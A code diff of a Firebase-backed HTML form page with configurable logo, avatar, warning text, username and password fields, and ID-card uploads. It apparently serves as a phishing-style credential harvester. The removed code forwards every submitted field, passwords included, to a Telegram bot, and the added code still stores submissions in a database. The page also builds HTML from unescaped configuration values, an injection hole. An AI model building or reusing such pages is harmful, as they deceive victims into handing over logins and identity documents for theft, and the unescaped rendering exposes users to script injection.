@@ -11,39 +11,15 @@ body{
   background:#f4f6f8;
   padding:20px;
 }
-
-/* ===== BACKGROUND LAYERS (ADDED) ===== */
 #bgVideoLayer{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100vw;
-  height:100vh;
-  object-fit:cover;
-  z-index:-3;
-  display:none;
+  position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:-3; display:none;
 }
 #bgImageLayer{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100vw;
-  height:100vh;
-  background-size:cover;
-  background-position:center;
-  background-repeat:no-repeat;
-  z-index:-2;
+  position:fixed; top:0; left:0; width:100vw; height:100vh; background-size:cover; background-position:center; background-repeat:no-repeat; z-index:-2;
 }
 #bgColorLayer{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100vw;
-  height:100vh;
-  z-index:-1;
+  position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:-1;
 }
-
-/* ===== EXISTING STYLES (UNCHANGED) ===== */
 #formContainer{
   max-width:600px;
   margin:auto;
@@ -52,51 +28,15 @@ body{
   border-radius:10px;
   box-shadow:0 0 10px rgba(0,0,0,0.1);
 }
-
 .builder-media{text-align:center;margin-bottom:12px;}
 .builder-media img{max-width:140px;height:auto;margin-bottom:8px;}
-
 h2{text-align:center;margin:10px 0;}
 #formDesc{text-align:center;margin-bottom:12px;}
-
-#failureWarning{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:4px;
-}
-#submitResult{
-  color:#2e7d32;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:10px;
-  opacity:0;
-  transition:opacity 0.5s;
-}
-
-input, textarea, button{
-  width:100%;
-  padding:10px;
-  margin:8px 0;
-  border-radius:6px;
-  border:1px solid #ccc;
-  box-sizing:border-box;
-}
-
-button{
-  cursor:pointer;
-  background:#1976d2;
-  color:#fff;
-  border:none;
-}
-
-.embedLink{
-  margin-top:6px;
-  padding:6px;
-  background:#e8f0fe;
-  border-radius:6px;
-  word-break:break-all;
-}
+#failureWarning{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:4px;}
+#submitResult{color:#2e7d32;font-weight:bold;text-align:center;margin-bottom:10px;opacity:0;transition:opacity 0.5s;}
+input, textarea, button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
+button{cursor:pointer;background:#1976d2;color:#fff;border:none;}
+.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all;}
 </style>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
@@ -104,26 +44,18 @@ button{
 </head>
 
 <body>
-
-<!-- ===== BACKGROUND ELEMENTS (ADDED) ===== -->
 <video id="bgVideoLayer" autoplay muted loop playsinline></video>
 <div id="bgImageLayer"></div>
 <div id="bgColorLayer"></div>
 
 <div id="formContainer">
-
   <div id="imageContainer" class="builder-media"></div>
-
   <h2 id="formTitle">Loading...</h2>
   <div id="formDesc"></div>
-
   <div id="failureWarning"></div>
   <div id="submitResult">✅ Submitted Successfully</div>
-
   <form id="dynamicForm"></form>
-
   <div id="embedLinks"></div>
-
 </div>
 
 <script>
@@ -151,279 +83,89 @@ if(!formId){
   $("formTitle").innerText = "Form ID missing!";
 }
 
-/* LOAD FORM */
-db.collection("forms").doc(formId).get().then(doc=>{
-  if(!doc.exists){
-    $("formTitle").innerText = "Form not found!";
-    return;
-  }
-  formConfig = doc.data();
-  renderForm();
-});
+/* LOAD FORM - CORRECTED PATH */
+const parentDocId = "NbU3q0ca3c0Ocs4quouS"; // Your parent doc in 'emergency'
+db.collection("emergency")
+  .doc(parentDocId)
+  .collection("forms")
+  .doc(formId)
+  .get()
+  .then(doc => {
+    if(!doc.exists){
+      $("formTitle").innerText = "Form not found!";
+      return;
+    }
+    formConfig = doc.data();
+    renderForm();
+  });
 
-/* ===== BACKGROUND LOADER (FINAL – SAFE TO REPLACE) ===== */
+/* BACKGROUND LOADER */
 function loadBackgroundFromForm(cfg){
   if(!cfg) return;
-
-  // Enable background mode
   document.body.classList.add("has-bg");
-
-  const bgVideo = $("bgVideoLayer");
-  const bgImage = $("bgImageLayer");
-  const bgColor = $("bgColorLayer");
-
-  // Reset layers
-  if(bgVideo){
-    bgVideo.pause();
-    bgVideo.src = "";
-    bgVideo.style.display = "none";
-  }
-
-  if(bgImage){
-    bgImage.style.backgroundImage = "";
-  }
-
-  if(bgColor){
-    bgColor.style.backgroundColor = "";
-  }
-
-  // Apply background color
-  if(cfg.bgColor && bgColor){
-    bgColor.style.backgroundColor = cfg.bgColor;
-  }
-
-  // Apply background image
-  if(cfg.bgImageURL && bgImage){
-    bgImage.style.backgroundImage = `url(${cfg.bgImageURL})`;
-    bgImage.style.backgroundSize = cfg.bgSize || "cover";
-    bgImage.style.backgroundPosition = "center";
-    bgImage.style.backgroundRepeat = "no-repeat";
-  }
-
-  // Apply background video
-  if(cfg.bgVideoURL && bgVideo){
-    bgVideo.src = cfg.bgVideoURL;
-    bgVideo.style.display = "block";
-    bgVideo.muted = true;
-    bgVideo.loop = true;
-    bgVideo.autoplay = true;
-    bgVideo.playsInline = true;
-    bgVideo.play().catch(()=>{});
-  }
+  const bgVideo = $("bgVideoLayer"), bgImage = $("bgImageLayer"), bgColor = $("bgColorLayer");
+  if(bgVideo){ bgVideo.pause(); bgVideo.src=""; bgVideo.style.display="none"; }
+  if(bgImage) bgImage.style.backgroundImage = "";
+  if(bgColor) bgColor.style.backgroundColor = "";
+  if(cfg.bgColor) bgColor.style.backgroundColor = cfg.bgColor;
+  if(cfg.bgImageURL){ bgImage.style.backgroundImage=`url(${cfg.bgImageURL})`; bgImage.style.backgroundSize=cfg.bgSize||"cover"; bgImage.style.backgroundPosition="center"; bgImage.style.backgroundRepeat="no-repeat"; }
+  if(cfg.bgVideoURL){ bgVideo.src=cfg.bgVideoURL; bgVideo.style.display="block"; bgVideo.muted=true; bgVideo.loop=true; bgVideo.autoplay=true; bgVideo.playsInline=true; bgVideo.play().catch(()=>{}); }
 }
 
-/* RENDER (ORIGINAL LOGIC UNCHANGED) */
+/* RENDER FORM */
 function renderForm() {
   $("formTitle").innerText = formConfig.title || "";
   $("formTitle").style.color = formConfig.titleColor || "#000";
-
   $("formDesc").innerText = formConfig.description || "";
   $("formDesc").style.color = formConfig.textColor || "#444";
+  imageContainer.innerHTML = ""; formEl.innerHTML = ""; embedEl.innerHTML = ""; failureWarning.innerText = "";
 
-  imageContainer.innerHTML = "";
-  formEl.innerHTML = "";
-  embedEl.innerHTML = "";
-  failureWarning.innerText = "";
+  if(formConfig.avatarURL) imageContainer.innerHTML+=`<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
+  if(formConfig.logoURL) imageContainer.innerHTML+=`<img src="${formConfig.logoURL}">`;
+  if(formConfig.enableWarning && formConfig.warning) failureWarning.innerText=formConfig.warning;
 
-  // Avatar & Logo
-  if(formConfig.avatarURL){
-    imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
-  }
-  if(formConfig.logoURL){
-    imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
-  }
-
-  // Warning
-  if(formConfig.enableWarning && formConfig.warning){
-    failureWarning.innerText = formConfig.warning;
-  }
-
-  // Username & Password
   if(formConfig.addAuth && formConfig.usernamePlaceholder && formConfig.passwordPlaceholder){
-    formEl.innerHTML += `
-      <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
-      <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>
-    `;
+    formEl.innerHTML+=`<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
+                        <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
   }
 
-  // Extra Fields
   if(Array.isArray(formConfig.extraFields)){
     formConfig.extraFields.filter(f=>f?.trim()).forEach(f=>{
       formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
     });
   }
 
-  // -----------------------
-  // ID Upload Section
-  // -----------------------
-  if(formConfig.idFrontChk || formConfig.idBackChk){
-    const idBox = document.createElement("div");
-    idBox.style.background = formConfig.idSectionBg || "#f7f9fc";
-    idBox.style.padding = "10px";
-    idBox.style.borderRadius = "8px";
-    idBox.style.marginBottom = "8px";
-
-    if(formConfig.idFrontChk){
-      const frontLabel = document.createElement("label");
-      frontLabel.textContent = formConfig.idFrontText || "Upload ID Front";
-      const frontInput = document.createElement("input");
-      frontInput.type = "file";
-      frontInput.name = "idFront";
-      idBox.appendChild(frontLabel);
-      idBox.appendChild(frontInput);
-    }
-
-    if(formConfig.idBackChk){
-      const backLabel = document.createElement("label");
-      backLabel.textContent = formConfig.idBackText || "Upload ID Back";
-      const backInput = document.createElement("input");
-      backInput.type = "file";
-      backInput.name = "idBack";
-      idBox.appendChild(backLabel);
-      idBox.appendChild(backInput);
-    }
-
-    formEl.appendChild(idBox);
-  }
-
-  // -----------------------
-  // Custom Fields
-  // -----------------------
-  if(Array.isArray(formConfig.customFields)){
-    formConfig.customFields.forEach(fld=>{
-      const wrapper = document.createElement("div");
-      wrapper.style.marginBottom = "8px";
-      const input = document.createElement("input");
-      input.type = fld.type || "text";
-      input.name = fld.label || "field";
-      input.placeholder = fld.label || "Field";
-      wrapper.appendChild(input);
-      formEl.appendChild(wrapper);
-    });
-  }
-
-  // -----------------------
-  // Gallery Items (Image + Link + Description)
-  // -----------------------
-  if(Array.isArray(formConfig.galleryItems)){
-    formConfig.galleryItems.forEach(g=>{
-      if(!g.img) return;
-      const div = document.createElement("div");
-      div.style.marginBottom = "8px";
-      div.innerHTML = `<a href="${g.link||'#'}" target="_blank"><img src="${g.img}" style="width:100%;border-radius:6px;margin:6px 0;"></a>`;
-      if(g.desc) div.innerHTML += `<small>${g.desc}</small>`;
-      formEl.appendChild(div);
-    });
-  }
-
-  // -----------------------
-  // Videos
-  // -----------------------
-  if(formConfig.videoLinks){
-    formConfig.videoLinks.split(",").forEach(link=>{
-      link = link.trim();
-      if(!link) return;
-
-      let videoEl;
-      if(link.endsWith(".mp4") || link.endsWith(".webm")){
-        videoEl = document.createElement("video");
-        videoEl.src = link;
-        videoEl.controls = true;
-        videoEl.style.width = "100%";
-        videoEl.style.borderRadius = "6px";
-        videoEl.style.margin = "6px 0";
-      } else {
-        const videoId = link.split("v=")[1]?.split("&")[0];
-        if(videoId){
-          videoEl = document.createElement("iframe");
-          videoEl.src = `https://www.youtube.com/embed/${videoId}`;
-          videoEl.width = "100%";
-          videoEl.height = "315";
-          videoEl.frameBorder = "0";
-          videoEl.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
-          videoEl.allowFullscreen = true;
-          videoEl.style.margin = "6px 0";
-        }
-      }
-
-      if(videoEl) formEl.appendChild(videoEl);
-    });
-  }
-
-  // -----------------------
   // Main Button
-  // -----------------------
   if(formConfig.showMainBtn && formConfig.buttonText){
     const btn = document.createElement("button");
-    btn.textContent = formConfig.buttonText;
-    btn.style.background = formConfig.btnColor || "#1976d2";
-    btn.style.color = "#fff";
-    btn.onclick = submitForm;
+    btn.textContent=formConfig.buttonText;
+    btn.style.background=formConfig.btnColor||"#1976d2";
+    btn.style.color="#fff";
+    btn.onclick=submitForm;
     formEl.appendChild(btn);
   }
 
-  // -----------------------
   // Embed Links
-  // -----------------------
   if(Array.isArray(formConfig.embedLinks)){
     formConfig.embedLinks.forEach(l=>{
       if(!l?.show || !l.url) return;
-      const div = document.createElement("div");
-      div.className = "embedLink";
-      div.innerHTML = `<strong>${l.text || ""}</strong><br><a href="${l.url}" target="_blank">${l.url}</a>`;
-      if(l.desc) div.innerHTML += `<br><small>${l.desc}</small>`;
+      const div=document.createElement("div"); div.className="embedLink";
+      div.innerHTML=`<strong>${l.text||""}</strong><br><a href="${l.url}" target="_blank">${l.url}</a>`;
+      if(l.desc) div.innerHTML+=`<br><small>${l.desc}</small>`;
       embedEl.appendChild(div);
     });
   }
 
-  // -----------------------
   // Background
-  // -----------------------
   loadBackgroundFromForm(formConfig);
 }
 
-/* TELEGRAM ALERT */
-function sendTelegramAlert(data){
-  const BOT_TOKEN = "YOUR_BOT_TOKEN";
-  const CHAT_ID = "YOUR_CHAT_ID";
-
-  let msg = `📥 *New Form Submission*\n\n`;
-  msg += `🆔 Form ID: ${formId}\n`;
-  msg += `📄 Title: ${formConfig.title || "Untitled"}\n\n`;
-
-  Object.entries(data).forEach(([k,v])=>msg+=`• ${k}: ${v}\n`);
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
-  });
-}
-
-/* EMAIL ALERT PLACEHOLDER */
-function sendEmailAlert(data){
-  console.log("EMAIL ALERT", {formId,title:formConfig.title,data});
-}
-
-/* SUBMIT */
+/* SUBMIT FORM */
 function submitForm(e){
   e.preventDefault();
-
-  const data = {};
-  formEl.querySelectorAll("input,textarea").forEach(i=>{
-    if(i.value.trim()) data[i.name]=i.value;
-  });
-
-  db.collection("submissions").add({
-    formId,
-    title: formConfig.title || "",
-    data,
-    createdAt: new Date().toISOString()
-  });
-
-  sendTelegramAlert(data);
-  sendEmailAlert(data);
-
+  const data={};
+  formEl.querySelectorAll("input,textarea").forEach(i=>{ if(i.value.trim()) data[i.name]=i.value; });
+  db.collection("submissions").add({ formId, title:formConfig.title||"", data, createdAt:new Date().toISOString() });
   submitResult.style.opacity=1;
   setTimeout(()=>submitResult.style.opacity=0,3000);
   formEl.reset();
